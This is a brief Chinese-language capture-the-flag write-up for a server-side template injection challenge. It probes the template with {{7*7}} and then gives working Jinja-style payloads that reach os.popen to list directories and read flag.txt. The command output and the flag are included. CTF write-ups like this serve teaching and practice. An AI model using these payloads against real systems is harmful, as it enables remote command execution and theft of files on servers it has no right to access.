題目都說是 ssti 了
先試試 {{ 7* 7}}，不出意外的是 49
接下來用 `{{ request.application.__globals__['__builtins__'].__import__('os').popen('ls').read() }}` ，可以看到只有一個 app.py
於是就用 `{{ request.application.__globals__['__builtins__'].__import__('os').popen('cd ..;ls').read() }}`，可以看到 flag.txt
```
<p> So app
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
requirements.txt
root
run
sbin
srv
sys
tmp
usr
var
 is your favourite model?</p>
```
最後用 `{{ request.application.__globals__['__builtins__'].__import__('os').popen('cd ..;cat flag.txt').read() }}`，即可得到 flag
RAM{ins3cure_dr0pdown}